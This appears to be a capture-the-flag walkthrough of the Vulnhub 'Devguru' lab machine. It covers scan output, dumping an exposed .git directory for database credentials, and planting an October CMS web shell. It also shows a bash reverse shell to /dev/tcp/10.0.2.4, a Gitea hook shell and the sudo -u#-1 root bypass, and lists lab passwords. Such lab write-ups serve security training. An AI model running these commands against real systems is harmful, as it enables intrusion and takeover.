# Devguru

Author: Vulnhub
Difficulty: 3
Key takeaway: Check the password everywhere
Tags: git, october cms
Type: Linux

# Enumeration

- portscan

```bash
# Nmap 7.92 scan initiated Wed Nov 10 08:37:50 2021 as: nmap -p22,80,8585 -sV -sC -T4 -Pn -oA 10.0.2.11 10.0.2.11
Nmap scan report for dev.guru (10.0.2.11)
Host is up (0.00057s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: DevGuru
|_http-title: Corp - DevGuru
| http-git: 
|   10.0.2.11:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
8585/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=64ef818b11ac78ac; Path=/; HttpOnly
|     Set-Cookie: _csrf=KlQgzskJjUm97oQeVt1ukNILuP46MTYzNjU1MTQ3ODczODg5NDUxMg; Path=/; Expires=Thu, 11 Nov 2021 13:37:58 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 10 Nov 2021 13:37:58 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=db58f4d1f845d390; Path=/; HttpOnly
|     Set-Cookie: _csrf=6V3t4B6V_kWp61__MeaLJlwKorI6MTYzNjU1MTQ3ODgxMjUwODI5NQ; Path=/; Expires=Thu, 11 Nov 2021 13:37:58 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 10 Nov 2021 13:37:58 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8585-TCP:V=7.92%I=7%D=11/10%Time=618BCB36%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2A02,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=64ef818b11ac78ac
SF:;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=KlQgzskJjUm97oQeVt1ukN
SF:ILuP46MTYzNjU1MTQ3ODczODg5NDUxMg;\x20Path=/;\x20Expires=Thu,\x2011\x20N
SF:ov\x202021\x2013:37:58\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEO
SF:RIGIN\r\nDate:\x20Wed,\x2010\x20Nov\x202021\x2013:37:58\x20GMT\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\
SF:x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"
SF:viewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<m
SF:eta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title
SF:>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<lin
SF:k\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-
SF:credentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\">
SF:\n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20
SF:a\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20conte
SF:nt=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pa
SF:inless")%r(HTTPOptions,212A,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConten
SF:t-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x2
SF:0Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=db58f4d1f
SF:845d390;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=6V3t4B6V_kWp61_
SF:_MeaLJlwKorI6MTYzNjU1MTQ3ODgxMjUwODI5NQ;\x20Path=/;\x20Expires=Thu,\x20
SF:11\x20Nov\x202021\x2013:37:58\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x
SF:20SAMEORIGIN\r\nDate:\x20Wed,\x2010\x20Nov\x202021\x2013:37:58\x20GMT\r
SF:\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\
SF:n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20
SF:name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\"
SF:>\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\
SF:t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x20a\x20
SF:cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/ma
SF:nifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20name=\"t
SF:heme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"\x20con
SF:tent=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/>\n\t<m
SF:eta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\x20a\x2
SF:0c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 10 08:39:22 2021 -- 1 IP address (1 host up) scanned in 92.13 seconds
```

- dir scan

```perl
/index.php            (Status: 200) [Size: 12694]
/services             (Status: 200) [Size: 10002]
/themes               (Status: 301) [Size: 305] [--> http://dev.guru/themes/]
/0                    (Status: 200) [Size: 12644]
/modules              (Status: 301) [Size: 306] [--> http://dev.guru/modules/]
/about                (Status: 200) [Size: 18636]
/storage              (Status: 301) [Size: 306] [--> http://dev.guru/storage/]
/plugins              (Status: 301) [Size: 306] [--> http://dev.guru/plugins/]
/server.php           (Status: 200) [Size: 0]
/About                (Status: 200) [Size: 18636]
/backend              (Status: 302) [Size: 390] [--> http://dev.guru/backend/backend/auth]
/Services             (Status: 200) [Size: 10002]
/vendor               (Status: 301) [Size: 305] [--> http://dev.guru/vendor/]
/config               (Status: 301) [Size: 305] [--> http://dev.guru/config/]
```

- using [gitdumper.sh](http://gitdumper.sh) to extract git information and other files from [http://devguru.local:80/.git/](http://devguru.local:80/.git/)
- used [gitextractor.sh](http://gitextractor.sh) to retrieve deleted files from .git directory

```perl
cd .git
gitextractor.sh .. web_devguru
```

- found database creds inside config/database.php file

```perl
'sqlite' => [
            'driver'   => 'sqlite',
            'database' => 'storage/database.sqlite',
            'prefix'   => '',
        ],

        'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],

        'pgsql' => [
            'driver'   => 'pgsql',
            'host'     => 'localhost',
            'port'     => 5432,
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'charset'  => 'utf8',
            'prefix'   => '',
            'schema'   => 'public',
        ],

        'sqlsrv' => [
            'driver'   => 'sqlsrv',
            'host'     => 'localhost',
            'port'     => 1433,
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'prefix'   => '',
        ],
```

- [http://devguru.local/adminer.php](http://devguru.local/adminer.php) lets us access databases
- find frank's password hash, edit it with another bcrypt hash and use that to log into october cms

# Initial Access

- cms → pages → /home

```html
# page 
{{ this.page.myVar }}
```

```php
# code 
function onStart()
{
    $this->page["myVar"] = shell_exec($_GET['cmd']);
}
```

- from the /index.php?cmd=....
send a request to get a reverse shell
- used BurpSuite to send /bin/bash -c "bash -i >& /dev/tcp/10.0.2.4/1234 0>&1"

# Privilege Escalation

- found this in /var/backups/app.ini.bak

```bash
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
```

- found user creds from database

```bash
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
| id | lower_name | name  | full_name | email               | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | 
must_change_password | login_type | login_source | login_name | type | location | website | rands      | salt       | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar                           | avatar_email        | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme |
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
|  1 | frank      | frank |           | frank@devguru.local |                  0 | enabled                        | c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900 | pbkdf2           | 
                   0 |          0 |            0 |            |    0 |          |         | XueBH0eT2Y | Bop8nwtUiM | en-US    |             |   1605832197 |   1605841809 |      1605841809 |                    1 |                -1 |     
    1 |        1 |             0 |              0 |                  0 |                         1 |              0 | 13d0a7d733ae3042a5af559bddea54b3 | frank@devguru.local |                 1 |             0 |             0 |         0 |
         1 |         0 |           0 |          0 |                             0 |                 | gitea |
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
```

- either crack frank's password or change it by going to adminer.php and logging in as `gitea`

## Gitea exploit!!!

- log into frank's account
1. create a new repository and add a bash reverse shell script as post receive hook
    - this will execute everytime we push something into the repository
2. add, commit and push anything using frank's credentials
3. SHELL!!!

- sudo -l

```bash
(ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

- exploit

```bash
'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash

So user hacker can't run /bin/bash as root (!root)

User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash

With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash
```

# Notes

- sudo -u#-1 ...
    
    Description :
    Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
    -u#-1 returns as 0 which is root's id
    
    and /bin/bash is executed with root permission